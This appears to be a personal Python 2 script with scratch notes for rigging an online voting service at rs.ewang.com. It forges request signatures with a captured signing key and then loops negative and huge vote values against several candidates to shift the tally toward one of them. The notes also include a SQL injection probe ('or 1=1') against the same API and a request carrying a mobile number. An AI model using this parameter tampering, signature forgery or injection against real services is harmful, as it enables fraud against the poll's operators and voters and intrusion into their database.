# headers = {
# 'Host':'rs.ewang.com',
# 'User-Agent':'Dalvik/1.6.0 (Linux; U; Android 4.4.2; 2014501 MIUI/KHHCNBF5.0) Paros/3.2.13'}


# url = 'http://rs.ewang.com/fengyun/tou.php?bangid=0001&cid=0002700001&jiangid=0010&piao=100000&time=1426516263&userid=000023091&sig=a1f5b1841661d66583a9cba71878857a'

http://rs.ewang.com/fengyun/getcode.php?bangid=0001&mobile=18500290809&time=1426870745&sig=8b738f1bb60be12094535f231cb820e0

# bangid=0001&cid=0002700003&jiangid=0010&piao=0.1&sigkey=5506e84e4c6ba&time=1426516263&userid=000023090
bangid=0001&cid=0002700001&jiangid=0010&piao=-50&sigkey=5506e84e4c6ba&time=1427880822&userid=000023089

http://rs.ewang.com/fengyun/tou.php?bangid=0001&cid=0002700001&jiangid=0010&piao=-50&time=1427880822&userid=000023089&sig=23e2c676d9bd12786d1d010eb870a386

# najie - http://rs.ewang.com/fengyun/tou.php?bangid=0001&cid=0002700001&jiangid=0010&piao=0.6&time=1426870745&userid=000023089&sig=f018e91bd0c0fdf9b0972e5ef999493f

# http://rs.ewang.com/fengyun/tou.php?bangid=0001&cid=02005&jiangid=0004&piao=-2&time=1426871126&userid=000023089&sig=a42930b3f5b95891885ba83b539955a5

# huachengyu - http://rs.ewang.com/fengyun/tou.php?bangid=0001&cid=02005&jiangid=0004&piao=0.1&time=1426871402&userid=000023089&sig=0c1c4dc20a74ac85dcf506c89bfe36cb


# znegyimin - http://rs.ewang.com/fengyun/tou.php?bangid=0001&cid=02001&jiangid=0006&piao=100000000000000000000000000000000000000&time=1426871884&userid=000023089&sig=875b656aea873a043c39bec725bbaa12

# bangzi - http://rs.ewang.com/fengyun/tou.php?bangid=0001&cid=04009&jiangid=0008&piao=1000&time=1426872880&userid=000023089&sig=de2eea4a20636f4a5994673c9ea2b5a5

# http://rs.ewang.com/fengyun/tou.php?bangid=0001&cid=0002000012&jiangid=0013&piao=992&time=1426873168&userid=000023089&sig=7ed4d2d5db7f671fa72681b9f8f1f5ea
http://rs.ewang.com/fengyun/hou.php?bangid=0001&jiangid=0010&time=1427880822&userid=000023089&sig=08362750ff42ed148da01c9f741b4dd3

http://rs.ewang.com/fengyun/hou.php?bangid=0001&jiangid=0010%20or%201=1&time=1426870745&userid=000023089&sig=3f4ff24eba973893815cea3520e0f1cf

import hashlib
import os, sys
import Loginer
import time

url = sys.argv[1]
sigkey = sys.argv[2]
num = int(sys.argv[3])

paramstr = url[url.find('?')+1:url.find('sig')]
params = paramstr.split('&')
del params[6]
params.insert(4, 'sigkey='+sigkey)
code = hashlib.md5(reduce(lambda x,y:x+y, params)).hexdigest()
del params[4]
params.append('sig='+code)


session = Loginer.Session()
minusurl = 'http://rs.ewang.com/fengyun/tou.php?' + reduce(lambda x,y:x+y, params)

najieurl = 'http://rs.ewang.com/fengyun/tou.php?bangid=0001&cid=0002700001&jiangid=0010&piao=1&time=1426870745&userid=000023089&sig=c56ecf20bcc6e9eb921fdcddf721c38b'
for i in range(num):
	res = session.open(minusurl)
	print res.read()

	res = session.open(najieurl)
	print res.read()
	print 'sleep 2s.....'
	time.sleep(2)